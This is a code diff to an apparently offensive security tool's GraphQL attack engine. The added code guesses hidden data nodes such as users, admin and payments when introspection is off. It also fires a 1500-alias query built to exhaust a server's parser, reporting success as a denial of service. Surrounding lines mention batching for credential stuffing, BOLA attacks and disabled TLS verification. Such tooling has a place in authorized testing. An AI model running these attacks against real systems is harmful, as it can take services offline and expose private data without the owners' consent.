@@ -7,25 +7,34 @@ Handles: Introspection, Blind Schema Mapping, Query Batching, and Recursive BOLA
 
 import json
 import asyncio
+import httpx
 from rich.console import Console
 from urllib.parse import urljoin
 
-console = Console()
+from aura.ui.formatter import console
+from aura.core.engine_base import AbstractEngine
 
-class GraphQLReaper:
+class GraphQLReaper(AbstractEngine):
     """
     OMEGA Professional+: GraphQL Protocol Dominance.
     Reconstructs entire schemas and executes high-impact logic attacks.
     """
-    def __init__(self, target: str = None, session=None):
-        self.target = target
+    ENGINE_ID = "graphql_reaper"
+    
+    def __init__(self, *args, **kwargs):
+        super().__init__()
+        self.target = kwargs.get("target")
         import httpx
-        self.session = session or httpx.AsyncClient(verify=False)
+        self.session = kwargs.get("session") or httpx.AsyncClient(verify=False)
         self.schema = {}
         self.endpoints = []
 
     async def run(self):
         """v25.0: The Full GraphQL Destruction Cycle."""
+        # Sync target from context if initialized dynamically
+        if not self.target and self.context:
+            self.target = self.context.target_url
+            
         all_findings = []
         if not self.target: return all_findings
         
@@ -53,6 +62,11 @@ class GraphQLReaper:
                 batch_vuln = await self.test_batching(url)
                 if batch_vuln:
                     all_findings.append(batch_vuln)
+                    
+                # 3.1 Nested Aliasing DoS
+                dos_vuln = await self.test_nested_aliasing_dos(url)
+                if dos_vuln:
+                    all_findings.append(dos_vuln)
                 
                 # 4. Sensitive PII / Logic Mapping
                 sensitive_nodes = self.map_sensitive_fields()
@@ -93,7 +107,53 @@ class GraphQLReaper:
                     self.schema = data["data"]["__schema"]
                     return True
         except: pass
+        return await self.bruteforce_introspection(url)
+
+    async def bruteforce_introspection(self, url: str):
+        """Attempts to guess sensitive fields when introspection is disabled."""
+        common_nodes = ["users", "admin", "admins", "payments", "settings", "orders"]
+        findings = False
+        for node in common_nodes:
+            query = {"query": f"{{ {node} {{ id }} }}"}
+            try:
+                resp = await self.session.post(url, json=query)
+                if resp and resp.status_code == 200:
+                    data = resp.json()
+                    if "data" in data and node in data["data"] and data["data"][node] is not None:
+                        console.print(f"[bold red][🔥] Blind Introspection Guessed: {node}[/bold red]")
+                        findings = True
+            except: pass
+        if findings:
+            return True
         return False
+
+    async def test_nested_aliasing_dos(self, url: str):
+        """Shoots a massive 1500+ aliased query to exhaust GraphQL parsers."""
+        payload = "query { " + " ".join([f"a{i}: __typename" for i in range(1500)]) + " }"
+        import time
+        t0 = time.time()
+        try:
+            resp = await self.session.post(url, json={"query": payload}, timeout=12.0)
+            t1 = time.time()
+            # If the server hangs for over 4 seconds or dumps 500
+            if t1 - t0 > 4.0 or (resp and resp.status_code >= 500):
+                console.print(f"[bold red][☠️] GraphQL Parse Exhaustion (DoS) Successful on {url}[/bold red]")
+                return {
+                    "type": "GraphQL Aliasing DoS",
+                    "severity": "CRITICAL",
+                    "url": url,
+                    "content": f"Server was severely stalled ({t1-t0:.2f}s) or crashed (HTTP {resp.status_code if resp else 'Timeout'}) by processing 1500 simultaneous aliases."
+                }
+        except httpx.ReadTimeout:
+            console.print(f"[bold red][☠️] GraphQL Aliasing DoS Completely Stalled the Database (Timeout).[/bold red]")
+            return {
+                "type": "GraphQL Aliasing DoS",
+                "severity": "CRITICAL",
+                "url": url,
+                "content": "Database/Parser was locked up entirely causing a severe Timeout upon processing aliases."
+            }
+        except BaseException: pass
+        return None
 
     async def test_batching(self, url: str):
         """Tests for JSON array batching (allows massive credential stuffing/scraping)."""
